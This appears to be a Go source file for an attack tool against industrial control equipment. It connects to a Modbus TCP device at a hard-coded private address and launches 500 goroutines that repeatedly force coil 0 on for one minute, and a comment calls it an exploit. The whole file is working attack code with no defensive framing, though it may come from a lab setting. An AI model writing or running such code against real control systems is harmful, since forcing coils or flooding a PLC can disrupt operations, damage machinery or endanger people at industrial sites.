package main

import (
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/goburrow/modbus"
)

var wait sync.WaitGroup

func jammer(target modbus.Client) {

	for {
		results, err := target.WriteSingleCoil(0, 0xFF00)

		fmt.Printf("%T\n", results)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(results)
		}
	}
	defer wait.Done()

}

func main() {

	handler := modbus.NewTCPClientHandler("192.168.13.86:502")
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler)

	for i := 0; i < 500; i++ {
		wait.Add(1)
		go jammer(client)
	}

	//Runs the exploit for one minute then kills it
	timer2 := time.NewTimer(1 * time.Minute)
	go func() {
		<-timer2.C
		os.Exit(0)
	}()

	wait.Wait()
}
